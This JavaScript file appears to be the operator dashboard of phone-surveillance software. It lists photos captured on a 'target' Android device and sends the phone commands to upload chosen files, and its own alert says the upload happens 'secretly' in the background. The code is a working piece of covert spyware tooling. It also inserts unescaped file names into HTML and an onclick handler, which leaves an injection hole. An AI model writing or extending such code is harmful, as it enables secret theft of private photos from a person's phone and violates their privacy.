document.addEventListener('DOMContentLoaded', async () => {
    const container = document.getElementById('gallery-container');
    
    // 🚀 BUG FIX: Ensuring correct local storage keys are used
    const token = localStorage.getItem('owner_token');
    const deviceId = localStorage.getItem('active_device_id');

    if (!token || !deviceId) {
        container.innerHTML = '<p style="color: #d32f2f;">Critical Error: Session or Target Device ID missing. Please re-authenticate.</p>';
        return;
    }

    try {
        const configRes = await fetch('/api/config');
        const config = await configRes.json();
        
        // Fetching text/metadata from 'device_photos' table
        const queryUrl = `${config.supabase_url}/rest/v1/device_photos?device_id=eq.${deviceId}&order=created_at.desc&limit=10`;
        
        const photoRes = await fetch(queryUrl, {
            headers: {
                'apikey': config.supabase_key,
                'Authorization': `Bearer ${config.supabase_key}`
            }
        });

        const data = await photoRes.json();

        if (!data || data.length === 0) {
            container.innerHTML = '<div class="empty-state">No photos captured or synced yet.<br><small>Waiting for device payload...</small></div>';
            return;
        }

        container.innerHTML = '<div class="gallery-grid" id="grid"></div>';
        const grid = document.getElementById('grid');

        data.forEach(photo => {
            const card = document.createElement('div');
            card.className = 'photo-card';
            
            const dateObj = new Date(photo.created_at);
            const formattedDate = dateObj.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
            
            // Format size properly (Assuming Android sends size_bytes)
            const sizeInMB = photo.size_bytes ? (photo.size_bytes / (1024 * 1024)).toFixed(2) : "Unknown";

            // 🚀 SMART LOGIC: Agar URL already hai toh 'View Image' dikhao, warna 'Fetch from Phone'
            const isUploaded = photo.file_url && photo.file_url.startsWith('http');
            
            let actionHtml = '';
            if (isUploaded) {
                actionHtml = `<a href="${photo.file_url}" target="_blank" class="view-btn">👁️ View Uploaded Image</a>`;
            } else {
                // We pass the exact file path to the phone so it knows what to upload
                actionHtml = `<button class="action-btn" onclick="triggerMediaUpload('${photo.file_path}', '${photo.file_name}')">📥 Fetch Image From Phone</button>`;
            }

            card.innerHTML = `
                <div>
                    <div class="file-icon">🖼️</div>
                    <div class="file-name">${photo.file_name || 'Unknown_Image.jpg'}</div>
                    <div class="file-meta">
                        Captured: ${formattedDate}<br>
                        Size: ${sizeInMB} MB
                    </div>
                </div>
                <div>
                    ${actionHtml}
                </div>
            `;
            grid.appendChild(card);
        });

    } catch (error) {
        console.error("Gallery Sync Failure:", error);
        container.innerHTML = '<p style="color: #d32f2f;">Database connection failed. Check network logs.</p>';
    }
});

// ==========================================
// 🚀 COMMAND INJECTION FOR ON-DEMAND UPLOAD
// ==========================================
window.triggerMediaUpload = async function(filePath, fileName) {
    const isConfirmed = confirm(`Do you want to command the phone to upload "${fileName}" to the server?`);
    if (!isConfirmed) return;

    const token = localStorage.getItem('owner_token');
    const deviceId = localStorage.getItem('active_device_id');

    try {
        const res = await fetch(`/api/devices/${deviceId}/action`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({
                action: `upload_specific_file:${filePath}` // Sending strict command to Android
            })
        });

        const data = await res.json();
        
        if (data.status === 'success') {
            alert(`Command Sent! The device will secretly upload the image in the background. Refresh this page in a minute to view it.`);
        } else {
            alert(`Execution Failed: ${data.message}`);
        }
    } catch (error) {
        alert('Network Failure: Unable to establish secure link with the action server.');
        console.error(error);
    }
}
